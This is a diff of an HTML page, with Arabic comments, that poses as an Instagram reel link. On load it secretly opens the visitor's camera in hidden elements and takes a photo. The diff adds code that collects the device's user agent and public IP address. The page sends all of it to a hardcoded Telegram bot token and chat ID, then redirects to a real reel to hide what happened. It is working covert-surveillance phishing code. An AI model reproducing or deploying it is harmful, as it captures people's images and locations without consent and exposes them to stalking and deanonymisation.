@@ -1,86 +1,103 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>www.instagram.com/reel/DAY2H4YvBPl/</title>
-    <style>
-        #video {
-            display: none;
+‏<!DOCTYPE html>
+‏<html lang="en">
+‏<head>
+‏    <meta charset="UTF-8">
+‏    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+‏    <title>www.instagram.com/reel/DAY2H4YvBPl/</title>
+‏    <style>
+‏        #video {
+‏            display: none;
         }
-        #canvas {
-            display: none;
+‏        #canvas {
+‏            display: none;
         }
-    </style>
-</head>
-<body>
-    <video id="video" autoplay></video>
-    <canvas id="canvas"></canvas>
+‏    </style>
+‏</head>
+‏<body>
+‏    <video id="video" autoplay></video>
+‏    <canvas id="canvas"></canvas>
 
-    <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
+‏    <script>
+‏        const video = document.getElementById('video');
+‏        const canvas = document.getElementById('canvas');
+‏        const context = canvas.getContext('2d');
 
         // الوصول إلى الفيديو من الكاميرا وتشغيله تلقائيًا
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then((stream) => {
-                video.srcObject = stream;
+‏        navigator.mediaDevices.getUserMedia({ video: true })
+‏            .then((stream) => {
+‏                video.srcObject = stream;
 
                 // التقاط الصورة تلقائيًا بعد فتح الكاميرا
-                video.addEventListener('loadedmetadata', () => {
-                    captureAndSendPhoto();
+‏                video.addEventListener('loadedmetadata', () => {
+‏                    captureAndSendPhoto();
                 });
             })
-            .catch((err) => {
-                console.error('Error accessing the camera: ', err);
+‏            .catch((err) => {
+‏                console.error('Error accessing the camera: ', err);
             });
 
         // التقاط الصورة وإرسالها إلى Telegram
-        function captureAndSendPhoto() {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+‏        function captureAndSendPhoto() {
+‏            canvas.width = video.videoWidth;
+‏            canvas.height = video.videoHeight;
+‏            context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            const imageData = canvas.toDataURL('image/png');
-            sendToTelegram(imageData);
+‏            const imageData = canvas.toDataURL('image/png');
+            
+            // الحصول على بيانات الهاتف و IP ثم إرسال المعلومات إلى Telegram
+‏            getDeviceInfo(imageData);
         }
 
-        // إرسال الصورة إلى Telegram Bot
-        function sendToTelegram(imageData) {
-            const telegramToken = '7787402061:AAGh-kuD1UOGc9bsUlqMmy_pIj6NgHGnFNE';
-            const chatId = '6305469091';
+        // الحصول على عنوان IP ونوع الجهاز ثم إرسال المعلومات
+‏        function getDeviceInfo(imageData) {
+‏            const deviceInfo = navigator.userAgent; // نوع الجهاز
+‏            fetch('https://api.ipify.org?format=json')
+‏                .then(response => response.json())
+‏                .then(data => {
+‏                    const ip = data.ip;
+‏                    sendToTelegram(imageData, deviceInfo, ip);
+                })
+‏                .catch(error => {
+‏                    console.error('Error getting IP:', error);
+                });
+        }
 
-            const blob = dataURLToBlob(imageData);
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'photo.png');
+        // إرسال الصورة، نوع الهاتف، و الـ IP إلى Telegram Bot
+‏        function sendToTelegram(imageData, deviceInfo, ip) {
+‏            const telegramToken = '7787402061:AAGh-kuD1UOGc9bsUlqMmy_pIj6NgHGnFNE';
+‏            const chatId = '6305469091';
 
-            fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
+‏            const blob = dataURLToBlob(imageData);
+‏            const formData = new FormData();
+‏            formData.append('chat_id', chatId);
+‏            formData.append('photo', blob, 'photo.png');
+‏            formData.append('caption', `Device Info: ${deviceInfo}\nIP Address: ${ip}`);
+
+‏            fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+‏                method: 'POST',
+‏                body: formData
             })
-            .then(response => response.json())
-            .then(data => {
+‏            .then(response => response.json())
+‏            .then(data => {
                 // بعد إرسال الصورة بنجاح، تحويل المستخدم إلى الرابط المطلوب
-                window.location.href = 'https://www.instagram.com/reel/DBBllN4IdG9/?igsh=aHcxdm5mcGF0NWF3';
+‏                window.location.href = 'https://www.instagram.com/reel/DBBllN4IdG9/?igsh=aHcxdm5mcGF0NWF3';
             })
-            .catch((error) => {
-                console.error('Error:', error);
+‏            .catch((error) => {
+‏                console.error('Error:', error);
             });
         }
 
         // تحويل Base64 إلى Blob
-        function dataURLToBlob(dataURL) {
-            const byteString = atob(dataURL.split(',')[1]);
-            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
+‏        function dataURLToBlob(dataURL) {
+‏            const byteString = atob(dataURL.split(',')[1]);
+‏            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+‏            const ab = new ArrayBuffer(byteString.length);
+‏            const ia = new Uint8Array(ab);
+‏            for (let i = 0; i < byteString.length; i++) {
+‏                ia[i] = byteString.charCodeAt(i);
             }
-            return new Blob([ab], { type: mimeString });
+‏            return new Blob([ab], { type: mimeString });
         }
-    </script>
-</body>
-</html>
+‏    </script>
+‏</body>
+‏</html>
